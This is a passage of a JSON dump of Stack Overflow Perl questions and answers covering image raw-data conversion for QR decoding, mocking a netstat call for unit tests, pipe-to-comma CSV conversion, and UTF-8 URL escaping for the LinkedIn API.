Imager-&gt;new;\n$img-&gt;read(file=&gt;$file, type=&gt;'png') or die 'read:', $img-&gt;errstr;\nmy $gray = $img-&gt;convert(preset =&gt; 'gray');\n$gray-&gt;write(data =&gt; \\my $raw_imager, type =&gt; 'raw') or die 'write:', $gray-&gt;errstr;\n#hexdump($raw_imager);\n\nsay \"Different\" if $raw_magic cmp $raw_imager;\n\nsub hexdump {\n    my $data = shift;\n    my $n;\n    print $_, (++$n % 16) ? \" \" : \"\\n\"\n        for unpack '(A2)*', unpack 'H*', $data;\n    print \"\\n\";\n}\n</code></pre>\n\n<h2>EDIT</h2>\n\n<p>Adding some background information. I want to use the <a href=\"https://metacpan.org/pod/Barcode::ZBar\" rel=\"nofollow noreferrer\">Barcode::ZBar</a> package. So, calling my <code>decode_qr</code> with the raw data produced by the Image::Magick, the QR-decode decodes correctly the \"hello\", using the Imager's data doesn't.</p>\n\n<pre><code>decode_qr($raw_magic,  $im-&gt;Get(qw(columns rows)), 'magick');\ndecode_qr($raw_imager, $gray-&gt;getwidth(), $gray-&gt;getheight(), 'imager');\n\nsub decode_qr {\n        my($raw, $w, $h, $from) = @_;\n\n        path($from . '.raw')-&gt;spew_raw($raw);   #save the raw data\n\n        my $zimage = Barcode::ZBar::Image-&gt;new;\n        $zimage-&gt;set_format('Y800');\n        $zimage-&gt;set_size( $w, $h );\n        $zimage-&gt;set_data($raw);\n        Barcode::ZBar::ImageScanner-&gt;new-&gt;scan_image($zimage);\n        for my $sym ($zimage-&gt;get_symbols) {\n                say join(':', $from, $sym-&gt;get_type(), $sym-&gt;get_data());\n        }\n}\n</code></pre>\n"}, {"tags": ["perl", "unit-testing", "refactoring"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 4, "creation_date": 1462900644, "post_id": 37144880, "comment_id": 61828100, "body": "See <a href=\"http://stackoverflow.com/q/3678655/176646\">How do I mock Perl&#39;s built-in backticks operator?</a>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462902636, "post_id": 37144880, "comment_id": 61829170, "body": "Also, on *nix <code>netstat -r</code> just pulls data from /proc/net/route, so you could just parse it directly."}], "answers": [{"comments": [{"owner": {"reputation": 843, "user_id": 6020333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bea9014ebf1e1188cac53beb61560df8?s=128&d=identicon&r=PG&f=1", "display_name": "bart", "link": "https://stackoverflow.com/users/6020333/bart"}, "edited": false, "score": 2, "creation_date": 1462912961, "post_id": 37145321, "comment_id": 61835086, "body": "For mocking subroutines I prefer to use <a href=\"http://search.cpan.org/~gfranks/Test-MockModule-0.11/lib/Test/MockModule.pm\" rel=\"nofollow noreferrer\">search.cpan.org/~gfranks/Test-MockModule-0.11/lib/Test/&hellip;</a>"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 5, "last_activity_date": 1462901652, "creation_date": 1462901652, "answer_id": 37145321, "question_id": 37144880, "link": "https://stackoverflow.com/questions/37144880/refactor-perl-sub-for-testability/37145321#37145321", "title": "Refactor perl sub for testability", "body": "<p>First, change your code as follows:</p>\n\n<pre><code>sub getDataForSysRTable {\n    return `/usr/bin/netstat -rn`;\n}\n\nsub getSysRTable\n{\n    my $iface = shift;\n    return if not length($iface);\n    my %ip_routes;\n    my @routes = getDataForSysRTable();\n    foreach my $route(@routes) {\n        if ($route =~ /([\\S.]+)\\s+([\\d.]+.[\\d.]+.[\\d.]+.[\\d.]+)\\s+(UGS|UGHS)\\s+($iface)/ )\n            { $ip_routes {$1} = $2 }\n    }\n    return %ip_routes;\n}\n</code></pre>\n\n<p>Then for your test, you can do</p>\n\n<pre><code>local *getDataForSysRTable = sub { \n   ... return known data ...\n};\n\nmy $ip_routes = getSysRTable($iface);\n</code></pre>\n"}], "owner": {"reputation": 831, "user_id": 1183499, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/wimXT.jpg?s=128&g=1", "display_name": "Jev Bj&#246;rsell", "link": "https://stackoverflow.com/users/1183499/jev-bj%c3%b6rsell"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 1, "answer_count": 1, "score": 4, "last_activity_date": 1462901652, "creation_date": 1462900206, "question_id": 37144880, "link": "https://stackoverflow.com/questions/37144880/refactor-perl-sub-for-testability", "title": "Refactor perl sub for testability", "body": "<p>I have inherited a perl code base. Consider the following subroutine;</p>\n\n<pre><code>sub getSysRTable\n{\n    my $iface = shift;\n    return if not length($iface);\n    my %ip_routes;\n    my @routes = `/usr/bin/netstat -rn`;\n    foreach my $route(@routes) {\n        if ($route =~ /([\\S.]+)\\s+([\\d.]+.[\\d.]+.[\\d.]+.[\\d.]+)\\s+(UGS|UGHS)\\s+($iface)/ )\n            { $ip_routes {$1} = $2 }\n    }\n    return %ip_routes;\n}\n</code></pre>\n\n<p>I want to write unit tests for this code. The testing I have in mind will use sample output from <code>netstat -rn</code> and check for expected behaviour. The sub as is, invokes a command, so injecting my test data is problematic with this implementation.</p>\n\n<p>What is the idiomatic perlish approach to refactoring this sub for testability?</p>\n"}, {"tags": ["perl", "parsing", "csv", "split"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462894528, "post_id": 37142995, "comment_id": 61824383, "body": "I assume this is just a mis-copy, but <code>split(&#47;|&#47;, $line);</code> should be <code>split(&#47;\\|&#47;, $line);</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1462895444, "post_id": 37142995, "comment_id": 61825076, "body": "<i>&quot; I need to do the same, then put them back together as comma-delimited files&quot;</i> No, you don&#39;t, you just need to split the data on pipes instead of commas and proceed as normal from there. Please don&#39;t try to recreate your &quot;expected&quot; input file from the real one first, as you will introduce a whole new layer of bugs"}, {"owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462895457, "post_id": 37142995, "comment_id": 61825090, "body": "Thanks @ThisSuitIsBlackNot - it was actually me quickly throwing pipe in place of the comma that was originally there - didn&#39;t know I needed the escape!"}, {"owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462895683, "post_id": 37142995, "comment_id": 61825225, "body": "@Borodin - I meant I don&#39;t need to change anything I&#39;m doing within the script other than split it now on pipes and put it back together with commas.  The parsing and formatting within stays the same."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462896067, "post_id": 37142995, "comment_id": 61825474, "body": "Since you were already (presumably) successfully splitting each line into fields, and you already know how to split on pipe characters, the rest of your code should be unchanged. The core of your question seems to be <i>&quot;how do I put the data back as comma-delimited?&quot;</i>  But that&#39;s independent of the original separator and you haven&#39;t shown any code that has anything to do with that. Please show the Perl code that you have tried and explain how it didn&#39;t work for you, and show some real-life input and output data"}, {"owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462896641, "post_id": 37142995, "comment_id": 61825812, "body": "No @Borodin - I&#39;m sorry if it&#39;s unclear.  ThisSuitIsBlackNot was pointing out that I needed the escape / for the | - which I did not know, not having worked with a pipe delimited file before.  What I don&#39;t know how to do is write the records back to the file with a comma delimiter since it was originally a pipe."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462897043, "post_id": 37142995, "comment_id": 61826076, "body": "@BigRedEO Borodin is saying that you shouldn&#39;t convert your file to CSV. Just change your existing code to split on pipes instead of commas."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1462897086, "post_id": 37142995, "comment_id": 61826111, "body": "You will need to watch out for commas in the data fields. Pipe-delimited data allows a field to contain commas, but for comma-delimited output you will need to quote such a field."}, {"owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462897177, "post_id": 37142995, "comment_id": 61826160, "body": "@ThisSuitIsBlackNot - but if I push it back to the file, won&#39;t it still be a pipe-delimited file?"}, {"owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1462897298, "post_id": 37142995, "comment_id": 61826226, "body": "@rici - my code in between scrubs all commas, single quotes, double quotes and backslashes."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1462897683, "post_id": 37142995, "comment_id": 61826439, "body": "@BigRedEO You&#39;re not <code>push</code>ing to a <i>file</i>; you&#39;re <code>push</code>ing to an <i>array</i>! What you&#39;re doing with that array is anybody&#39;s guess---you haven&#39;t shown us!"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1462897804, "post_id": 37142995, "comment_id": 61826500, "body": "It sounds like the real problem is that you don&#39;t know how to join an array into a single string with separators between the elements. For that, we have <a href=\"http://perldoc.perl.org/functions/join.html\" rel=\"nofollow noreferrer\"><code>join</code></a>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462897906, "post_id": 37142995, "comment_id": 61826568, "body": "@BigRedEO Push what back to what file? You have a pipe-delimited file containing your input data. Your end goal is presumably to parse the file to get the contents of each of the fields and do something with them. Based on your previous questions, it sounds like you&#39;ve written a preprocessor to remove commas, quotes, etc. from a CSV, which is just an elaborate workaround to avoid using a proper CSV parser like Text::CSV. Now you&#39;re trying to convert your pipe-limited file to a CSV so your preprocessor can handle it, but this is just <i>another</i> hacky workaround, because <i>(continued)</i>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462897912, "post_id": 37142995, "comment_id": 61826573, "body": "you could just modify your preprocessor to work on pipe-delimited files. Instead of all these hacky workarounds built upon workarounds, you should just download the source for Text::CSV and bundle it with your script. Text::CSV is just a Perl script and will eliminate the need for your preprocessor and your pre-preprocessor."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462903384, "post_id": 37142995, "comment_id": 61829655, "body": "Please updater us on the status of this question. Is your problem solved?"}], "answers": [{"comments": [{"owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "edited": false, "score": 0, "creation_date": 1462895405, "post_id": 37143076, "comment_id": 61825049, "body": "You have the variable $output_line to put the data back.  How would that work to write it back to the same file?  Or does it have to go to a different file name?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 4, "creation_date": 1462895500, "post_id": 37143076, "comment_id": 61825119, "body": "<code>split(&#47;\\Q|\\E&#47;, $line)</code> is usually written <code>split &#47;\\|&#47;, $line</code>"}], "tags": [], "owner": {"reputation": 18466, "user_id": 477563, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/07a89fb7b2fd8ece1e9e39e95e004a36?s=128&d=identicon&r=PG", "display_name": "Mr. Llama", "link": "https://stackoverflow.com/users/477563/mr-llama"}, "is_accepted": false, "score": 1, "last_activity_date": 1462894503, "creation_date": 1462894503, "answer_id": 37143076, "question_id": 37142995, "link": "https://stackoverflow.com/questions/37142995/from-pipe-delimited-to-comma-delimited/37143076#37143076", "title": "From pipe delimited to comma delimited?", "body": "<p>A few things.  First, fix your shebang (the <code>#!</code> line) so it doesn't contain a trailing <code>/</code>.</p>\n\n<p>Secondly, perl uses regular expressions for splitting, so you'll want to escape the pipe character when splitting:</p>\n\n<pre><code>my @fields = split(/\\Q|\\E/, $line);\n</code></pre>\n\n<p>Lastly, you can use <a href=\"http://perldoc.perl.org/functions/join.html\" rel=\"nofollow\"><code>join</code></a> to join the elements of an array into a string.  This uses a string literal, not a regular expression.</p>\n\n<pre><code>my $output_line = join(',', @fields);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "edited": false, "score": 0, "creation_date": 1462897413, "post_id": 37144033, "comment_id": 61826289, "body": "My script was already working as is.  Just that now I have a pipe-delimited file and need it to be scrubbed and put back together as a comma-delimited file.  Text::CSV is not available to me nor will it be made available to me.  What I have works. I just need to now account for the pipes."}], "tags": [], "owner": {"reputation": 25491, "user_id": 49197, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/15ebf24a33a29b9efbf9924f530dd736?s=128&d=identicon&r=PG", "display_name": "Hynek -Pichi- Vychodil", "link": "https://stackoverflow.com/users/49197/hynek-pichi-vychodil"}, "is_accepted": false, "score": 2, "last_activity_date": 1462898206, "last_edit_date": 1462898206, "creation_date": 1462897285, "answer_id": 37144033, "question_id": 37142995, "link": "https://stackoverflow.com/questions/37142995/from-pipe-delimited-to-comma-delimited/37144033#37144033", "title": "From pipe delimited to comma delimited?", "body": "<p>Do not parse CSV file using split. Use proper parser.</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse autodie;\nuse Text::CSV_XS;\n\nmy $csv_in = Text::CSV_XS-&gt;new( { binary =&gt; 1, sep_char =&gt; \"|\" } );\nmy $csv_out = Text::CSV_XS-&gt;new( { binary =&gt; 1, sep_char =&gt; \",\", eol =&gt; $/ } );\nwhile ( my $row = $csv_in-&gt;getline(*ARGV) ) {\n    $csv_out-&gt;print( *STDOUT, $row );\n}\n</code></pre>\n\n<p>If it is true you just need change pipe delimited to a comma delimited, insert <code>tr '|' ','</code> into your pipe.</p>\n"}], "owner": {"reputation": 637, "user_id": 1921826, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/590a37833c2b2844cdecf0a96a3cc740?s=128&d=identicon&r=PG", "display_name": "BigRedEO", "link": "https://stackoverflow.com/users/1921826/bigredeo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 822, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1462898206, "creation_date": 1462894318, "question_id": 37142995, "link": "https://stackoverflow.com/questions/37142995/from-pipe-delimited-to-comma-delimited", "title": "From pipe delimited to comma delimited?", "body": "<p>I've got a working script that parses through a CSV file, scrubs the data and makes some changes before putting it back together.  The original file I was working with was comma-delimited.  But I just received all the actual files this will be run against and they are all pipe-delimited.  I need to do the same, then put them back together as comma-delimited files.</p>\n\n<p>So to start, I have -</p>\n\n<pre><code>#!/usr/bin/perl/\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\nuse Time::Piece;\n\nmy $filename = 'records.csv';\n\nopen my $FH, $filename\n  or die \"Could not read from $filename &lt;$!&gt;, program halting.\";\n\n# Read the header line.\nchomp(my $line = &lt;$FH&gt;);\nmy @fields = split(/|/, $line);\nprint Dumper(@fields), $/;\n\nmy @data;\n# Read the lines one by one.\nwhile($line = &lt;$FH&gt;) {\n\n    chomp($line);\n</code></pre>\n\n<p>...parse through my data, and then currently, I end with this to put the data back into the file -</p>\n\n<pre><code># put the records back\n    push @data, \\@fields;\n</code></pre>\n\n<p>But how do I put the data back as comma-delimited?</p>\n"}, {"tags": ["perl", "linkedin", "linkedin-api"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462891528, "post_id": 37140957, "comment_id": 61822195, "body": "What does the manual say?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462892044, "post_id": 37140957, "comment_id": 61822628, "body": "Generally speaking, should be the first. The problem could be with your <code>xxxxx</code>. Pleaes provide a dump the $url produced by the first snippet using the following: <code>{ use Data::Dumper; local $Data::Dumper::Useqq = 1; warn(Dumper($url)); }</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462893588, "post_id": 37140957, "comment_id": 61823756, "body": "<code>uri_escape_utf8(&#39;xxxxx&#39;)</code> is equal to <code>&#39;xxxxx&#39;</code>. Where does the string that you&#39;re passing to <code>uri_escape_utf8</code> come from? Is it a string literal in your code or have you read it from an external source? <code>uri_escape_utf8</code> won&#39;t work unless you have <i>decoded</i> any encoded strings, and if you are using string literals that means adding <code>use utf8</code> at the top of your program"}, {"owner": {"reputation": 3, "user_id": 3202825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53535302a4d3b11df2311c4a6354b2e3?s=128&d=identicon&r=PG&f=1", "display_name": "user3202825", "link": "https://stackoverflow.com/users/3202825/user3202825"}, "edited": false, "score": 0, "creation_date": 1462947293, "post_id": 37140957, "comment_id": 61845671, "body": "The url comes from the linkedin page: <a href=\"https://www.linkedin.com/in/ana&#239;s-th&#233;voz-b070838\" rel=\"nofollow noreferrer\">linkedin.com/in/ana&#239;s-th&#233;voz-b070838</a> for example"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 3202825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53535302a4d3b11df2311c4a6354b2e3?s=128&d=identicon&r=PG&f=1", "display_name": "user3202825", "link": "https://stackoverflow.com/users/3202825/user3202825"}, "edited": false, "score": 0, "creation_date": 1462947404, "post_id": 37142549, "comment_id": 61845720, "body": "Already tried encoding only the domain part leaving the other part without encoding like:  &quot; uri_escape_utf8(&#39;<a href=\"https://www.linkedin.com/&#39;\" rel=\"nofollow noreferrer\">linkedin.com/&#39;</a>) . &#39;rest/of/the/url&#39; &quot;"}, {"owner": {"reputation": 3, "user_id": 3202825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53535302a4d3b11df2311c4a6354b2e3?s=128&d=identicon&r=PG&f=1", "display_name": "user3202825", "link": "https://stackoverflow.com/users/3202825/user3202825"}, "edited": false, "score": 0, "creation_date": 1463124254, "post_id": 37142549, "comment_id": 61939064, "body": "good catch, i wasn&#39;t using use utf8! unfortunately linkedin API doesn&#39;t understand this url either. I&#39;m starting to think that is the linkedin API itself that has the problem."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 0, "last_activity_date": 1467555131, "last_edit_date": 1467555131, "creation_date": 1462893271, "answer_id": 37142549, "question_id": 37140957, "link": "https://stackoverflow.com/questions/37140957/how-to-retrieve-linkedin-profiles-via-api-for-accented-urls/37142549#37142549", "title": "How to retrieve linkedin profiles via api for accented urls?", "body": "<h3>Update</h3>\n\n<p>I'm pretty sure the problem will be that you don't have <code>use utf8</code> at the top of your program. This code correctly encodes the i-diaresis as <code>%C3%AF</code> and the e-acute as <code>%C3%A9</code></p>\n\n<pre><code>use utf8;\nuse strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse URI::Escape qw/ uri_escape_utf8 /;\n\nsay uri_escape_utf8('http://linkedin.com/in/ana\u00efs-th\u00e9voz-b070838');\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>http%3A%2F%2Flinkedin.com%2Fin%2Fana%C3%AFs-th%C3%A9voz-b070838\n</code></pre>\n\n<p>Whereas without the <code>use utf8</code>, Perl is seeing the UTF-8-encoded bytes instead of characters, like this</p>\n\n<pre><code>\"http://linkedin.com/in/ana\\xC3\\xAFs-th\\xC3\\xA9voz-b070838\"\n</code></pre>\n\n<p>and <code>uri_escape_utf8</code> double-encodes <code>\"\\xC3\\xAF\"</code> as <code>%C3%83%C2%AF</code> and <code>\"\\xC3\\xA9\"</code> as <code>%C3%83%C2%A9</code> like this</p>\n\n<h3>output</h3>\n\n<pre><code>http%3A%2F%2Flinkedin.com%2Fin%2Fana%C3%83%C2%AFs-th%C3%83%C2%A9voz-b070838\n</code></pre>\n\n<p>so the LinkedIn server gets confused</p>\n\n<p><br/></p>\n\n<hr>\n\n<p>URLs use only eight-bit octets and there is no assumed encoding for Unicode characters</p>\n\n<p><a href=\"https://www.ietf.org/rfc/rfc3986.txt\" rel=\"nofollow\">RFC 3986</a> is the current standard for Uniform Resource Identifiers (URIs), and Section 2 -- Characters -- explains that the only characters allowed in a URL are the special delimiters <code>!</code>, <code>#</code>, <code>$</code>, <code>&amp;</code>, <code>'</code>, <code>(</code>, <code>)</code>, <code>*</code>, <code>+</code>, <code>,</code>, <code>/</code>, <code>:</code>, <code>;</code>, <code>=</code>, <code>?</code>, <code>@</code>, <code>[</code>, <code>]</code> in addition to the unreserved characters that can be used to build identifiers which match the regex pattern <code>[0-9A-Za-z._~-]</code></p>\n\n<p>You can extend this restriction by using the percent sign <code>%</code> followed by two hex digits to represent any octet without its special meaning, but this doesn't cover multi-byte characters, and there is no implied encoding if they are used within a URL.</p>\n\n<p>If you are using <a href=\"https://metacpan.org/pod/URI::Escape\" rel=\"nofollow\"><code>URI::Escape</code></a> then <code>uri_escape_utf8</code> will correctly encode any string in UTF-8 as a combination of unreserved and percent-encoded characters, but the server must be expecting a utf-8-encoded URL</p>\n\n<p>The most likely problems are</p>\n\n<ul>\n<li><p>Your original string is already encoded and contains encoded bytes instead of characters, so <code>uri_escape_utf8</code> is encoding an encoded string</p></li>\n<li><p>The <em>LinkedIn</em> API doesn't expect UTF-8-encoded URLs</p></li>\n</ul>\n"}], "owner": {"reputation": 3, "user_id": 3202825, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/53535302a4d3b11df2311c4a6354b2e3?s=128&d=identicon&r=PG&f=1", "display_name": "user3202825", "link": "https://stackoverflow.com/users/3202825/user3202825"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 214, "favorite_count": 0, "accepted_answer_id": 37142549, "answer_count": 1, "score": -1, "last_activity_date": 1467555131, "creation_date": 1462889309, "question_id": 37140957, "link": "https://stackoverflow.com/questions/37140957/how-to-retrieve-linkedin-profiles-via-api-for-accented-urls", "title": "How to retrieve linkedin profiles via api for accented urls?", "body": "<p>I'm trying to get info from LinkedIn API, but i run into some issues when the urls have any kind of accented characters.</p>\n\n<p>For non-accented urls the call to the API works fine and i can retrieve data without problems, but when i try with accented urls i get an error.</p>\n\n<p>I have tried escaping the url but it doesn't work:</p>\n\n<p>uri_escape_utf8:</p>\n\n<pre><code>'https://api.linkedin.com/v1/people/url=' . uri_escape_utf8('xxxxx');\n</code></pre>\n\n<p>uri_escape:</p>\n\n<pre><code>'https://api.linkedin.com/v1/people/url=' . uri_escape('xxxxx');\n</code></pre>\n\n<p>no escaping:</p>\n\n<pre><code>'https://api.linkedin.com/v1/people/url=xxxxx';\n</code></pre>\n\n<p>double escape:</p>\n\n<pre><code>uri_escape_utf8('https://api.linkedin.com/v1/people/url=' . uri_escape_utf8('xxxxx'));\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 4, "creation_date": 1462887636, "post_id": 37140263, "comment_id": 61819269, "body": "You have no <code>(...)</code> in your regex."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, 